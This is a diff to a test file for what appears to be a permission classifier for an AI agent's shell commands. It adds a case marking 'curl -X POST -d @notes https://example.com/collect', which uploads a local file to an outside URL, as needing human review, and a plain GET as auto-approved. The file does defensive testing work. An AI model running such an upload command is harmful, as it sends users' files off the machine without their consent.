@@ -32,6 +32,9 @@ const CASES = [
   ['Bash', 'ssh pi@other uptime', 'human'],
   ['Bash', 'npm publish', 'human'],
   ['Bash', 'gh pr create --fill', 'human'],
+  // A GET is a read auto mode may answer; a body is data leaving the machine.
+  ['Bash', 'curl -X POST -d @notes https://example.com/collect', 'human'],
+  ['Bash', 'curl -s https://api.github.com/repos/a/b', 'auto'],
   ['Bash', 'git commit -m "push the button"', 'auto'],  // "push" as prose, not a subcommand
 
   // Destruction pointed outside the sandbox roots.
